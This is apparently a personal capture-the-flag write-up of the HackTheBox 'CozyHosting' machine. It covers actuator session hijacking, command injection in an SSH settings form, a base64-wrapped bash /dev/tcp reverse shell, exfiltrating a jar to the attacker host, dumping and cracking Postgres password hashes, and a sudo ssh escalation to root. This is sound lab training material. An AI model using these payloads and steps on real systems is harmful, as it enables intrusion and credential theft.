### NMAP

```
sudo nmap -sC -sV -oN nmap-cozyhosting 10.10.11.230
```

![[HackTheBox/Linux/attachments/Pasted image 20250508210349.png]]
- 22,80

Add `cozyhosting.htb` to `/etc/hosts`
### Enumerating website

Here it is 
![[HackTheBox/Linux/attachments/Pasted image 20250508210519.png]]

Clicking everything to see how to interact with the server. 

Login page is the only thing that loads 

![[HackTheBox/Linux/attachments/Pasted image 20250508210611.png]]
Logging in with admin:admin didn't work

### Gobuster

Subdirectory enum
```
gobuster dir -u http://cozyhosting.htb -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
```

Not a ton of results
![[HackTheBox/Linux/attachments/Pasted image 20250508211606.png]]

### Identify Web Framework

Intercept login request with Burp

![[HackTheBox/Linux/attachments/Pasted image 20250508210926.png]]
- notice JSESSIONID (Tomcat uses JSESSIONID)
- if there's JSESSIONID + NGINX -> test for offbyte slash vulns

Right click in Request window and click "Change Request Method" to go from POST to GET request

![[HackTheBox/Linux/attachments/Pasted image 20250508211135.png]]

Trying out `/manager/html`

![[HackTheBox/Linux/attachments/Pasted image 20250508211422.png]]

This "Whitelabel Error Page" string indicates SpringBoot
![[HackTheBox/Linux/attachments/Pasted image 20250508211455.png]]

There are wordlists for SpringBoot!

Check `/usr/share/seclists/Discovery/Web-Content/spring-boot.txt`

```
find /usr/share/seclists/ | grep -i spring
```

![[HackTheBox/Linux/attachments/Pasted image 20250508211722.png]]

### Gobuster with SpringBoot wordlist

```
gobuster dir -u http://cozyhosting.htb -w /usr/share/seclists/Discovery/Web-Content/spring-boot.txt 
```

Actuators open! Debug endpoints for SpringBoot apps
![[HackTheBox/Linux/attachments/Pasted image 20250508211916.png]]

### Enum Actuator Sub-Dirs

Navigate to `/actuator/env/lang`

![[HackTheBox/Linux/attachments/Pasted image 20250508212108.png]]
- gives us info about the environment

Navigate to `actuator/mappings` and try to hit the endpoints using Burp repeater...no dice tho

Navigate to `actuator/sessions`

![[HackTheBox/Linux/attachments/Pasted image 20250508212443.png]]
- got kanderson 

Copying kanderson's session and pasting it into developer tools on website 

![[HackTheBox/Linux/attachments/Pasted image 20250508212611.png]]
Refresh the web page. Notice login button disappears.

Try navigating to /admin and we can see the admin dashboard
![[HackTheBox/Linux/attachments/Pasted image 20250508212729.png]]

Notice a connection settings box and entering kali ip and a username
![[HackTheBox/Linux/attachments/Pasted image 20250508212816.png]]

Setup nc listener on port 22..
```
nc -lvnp 22
```

Then hit submit. 

![[HackTheBox/Linux/attachments/Pasted image 20250508212931.png]]
- No worky.

Trying 127.0.0.1 over port 22 and get a different error message 

![[HackTheBox/Linux/attachments/Pasted image 20250508213019.png]]

Go to Burp and intercept the request 

![[HackTheBox/Linux/attachments/Pasted image 20250508213101.png]]

Response
![[HackTheBox/Linux/attachments/Pasted image 20250508213118.png]]

Attempting to get the server to connect back by specifying a different ssh port 

![[HackTheBox/Linux/attachments/Pasted image 20250508213222.png]]

Error response 
![[HackTheBox/Linux/attachments/Pasted image 20250508213239.png]]

Guessing they don't want spaces in the hostname..

Attempting this brace expansion technique to remove spaces 

![[HackTheBox/Linux/attachments/Pasted image 20250508213415.png]]

Response is still an error tho 
![[HackTheBox/Linux/attachments/Pasted image 20250508213438.png]]

Try removing spaces using $IFS 
![[HackTheBox/Linux/attachments/Pasted image 20250508213518.png]]

Still the same error response. 

Thinking about bash's actual ssh command
```
ssh -p 2222 user@hostname 
```

Trying the different port again in the username field
![[HackTheBox/Linux/attachments/Pasted image 20250508213744.png]]

Different server error 
![[HackTheBox/Linux/attachments/Pasted image 20250508213802.png]]

Try brace expansion again
![[HackTheBox/Linux/attachments/Pasted image 20250508213828.png]]

Different error again 
![[HackTheBox/Linux/attachments/Pasted image 20250508213845.png]]

Randomly try -P 
![[HackTheBox/Linux/attachments/Pasted image 20250508213930.png]]

ssh error message this time 👀
![[HackTheBox/Linux/attachments/Pasted image 20250508213955.png]]
- this proves we have command injection 

Trying sleep 1 + multiple diff versions of sleep 1
![[HackTheBox/Linux/attachments/Pasted image 20250508214054.png]]

We have command execution with this 

![[HackTheBox/Linux/attachments/Pasted image 20250508214239.png]]

Let's get a shell.

### Obtain reverse shell through command injection vulnerability 

Payload
```
bash -i >& /dev/tcp/10.10.14.8/9001 0>&1
```

Base64 encode the payload 

```
base64 -w 0 shell
```

![[HackTheBox/Linux/attachments/Pasted image 20250508214458.png]]

Get rid of the bad characters like + and = by adding spaces to the payload script

Copy the payload now and paste it into Burp request 

![[HackTheBox/Linux/attachments/Pasted image 20250508214645.png]]

Add the base64 decode as well and echo to bash
![[HackTheBox/Linux/attachments/Pasted image 20250508214852.png]]

Set up nc listener and send the request and catch the shell
![[HackTheBox/Linux/attachments/Pasted image 20250508214921.png]]

❗got initial access as app user❗

Get interactive shell
### Enumerating for priv esc 

Notice this jar file. Normally java apps have an expanded version of jar files somewhere. 

Find the cloudhosting expanded jar 

```
find / 2>/dev/null | grep cloudhosting
```

![[HackTheBox/Linux/attachments/Pasted image 20250508215521.png]]

We could extract the jar and start looking through it ORRR..
see how this jar file is being hosted 

### Searching for services
#### Method 1
```
systemctl list-units --type=service
```

![[HackTheBox/Linux/attachments/Pasted image 20250508215723.png]]

#### Method 2
```
find /etc/ -name *.service
```

![[HackTheBox/Linux/attachments/Pasted image 20250508215913.png]]

We see the cozyhosting service 
![[HackTheBox/Linux/attachments/Pasted image 20250508215948.png]]

Checking out the service file 
![[HackTheBox/Linux/attachments/Pasted image 20250508220024.png]]

Extract the `cloudhosting-0.0.1.jar`

### Move the jar to kali host to view it more easily

Set up nc listener 
```
nc -lvnp 9001 > cozyhosting.jar
```

Cat the jar and redirect it to kali 

```
cat cloudhosting-0.0.1.jar > /dev/tcp/10.10.14.8/9001
```

![[HackTheBox/Linux/attachments/Pasted image 20250508220638.png]]

Extract the jar file 

```
7z x cozyhosting.jar
```

![[HackTheBox/Linux/attachments/Pasted image 20250508220735.png]]

### Enumerate the files from the jar

```
find . -name *.properties
```

![[HackTheBox/Linux/attachments/Pasted image 20250508220833.png]]

Let's look at the application.properties
![[HackTheBox/Linux/attachments/Pasted image 20250508220909.png]]
- WOOHOO postgres username and password

Try switching to the postgres user 

```
su - postgres
```

Paste the password

![[HackTheBox/Linux/attachments/Pasted image 20250508221024.png]]
- nope 

Try using psql 
```
psql -h localhost -U postgres 
```

![[HackTheBox/Linux/attachments/Pasted image 20250508221213.png]]

Successfully logged on to postgres

### Enumerating Postgres 

[Reference](https://hacktricks.boitatech.com.br/pentesting/pentesting-postgresql)

List the databases
 `\list`  

![[HackTheBox/Linux/attachments/Pasted image 20250508221656.png]]

Select a database 
`use cozyhosting`

List tables (this didn't work)
`\d`

Reconnecting to psql and specify cozyhosting database

```
psql -h localhost -U postgres -d cozyhosting
```

List tables again 
`\d`

![[HackTheBox/Linux/attachments/Pasted image 20250508221934.png]]

Dump users table 
```
select * from users;
```

![[HackTheBox/Linux/attachments/Pasted image 20250508222018.png]]
- got kanderson and admin hashes

Save these hashes to a file 
![[HackTheBox/Linux/attachments/Pasted image 20250508222108.png]]

### Hashcat

Determine hash type
$2* -> bcrypt
![[HackTheBox/Linux/attachments/Pasted image 20250508222409.png]]

Crack these hashiesss

```
hashcat --username -m 3200 hashes /usr/share/wordlists/rockyou.txt
```

Cracked one hash `manchesterunited`

![[HackTheBox/Linux/attachments/Pasted image 20250508222524.png]]

Grab username using --show flag 

```
hashcat --username -m 3200 hashes /usr/share/wordlists/rockyou.txt --show
```

![[HackTheBox/Linux/attachments/Pasted image 20250508222610.png]]
- admin hashhhhh

Checking out `/etc/passwd` to get usernames on the box.

Assuming that josh is an admin 

```
su - josh 
```

Now we're josh
![[HackTheBox/Linux/attachments/Pasted image 20250508222749.png]]

### Priv Esc to Root 

Run `sudo -l`

![[HackTheBox/Linux/attachments/Pasted image 20250508222824.png]]

We can run ssh as root. 

Pop over to GTFO bins.

There is a sudo rule for ssh.

Pasting GTFOBins payload anndd
![[HackTheBox/Linux/attachments/Pasted image 20250508222942.png]]

⭐got root⭐



